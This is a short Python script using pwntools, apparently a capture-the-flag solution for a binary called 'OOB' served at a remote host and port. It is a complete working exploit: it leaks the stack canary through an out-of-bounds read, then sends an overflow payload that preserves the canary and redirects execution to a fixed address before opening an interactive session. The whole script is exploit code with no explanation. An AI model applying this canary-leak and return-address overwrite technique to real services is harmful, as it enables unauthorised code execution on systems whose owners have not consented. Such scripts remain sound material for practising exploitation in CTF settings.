#!/usr/bin/env python3 

from pwn import *

HOST = "103.162.14.116"
PORT = 4445
context.binary = elf = ELF('./OOB', checksec = False) 
# p = process(elf.path)
p = remote(HOST, PORT)

p.sendlineafter(b'Intput write size:\n', b'100') 
canary_leaked = u64(p.recv(48)[-8:])
log.info('canary leaked = ' + hex(canary_leaked))

payload = b'x' * 40 + p64(canary_leaked) + b'x' * 8 + p64(0x0000000000401260)
p.sendline(b'100')
p.sendline(payload)


p.interactive()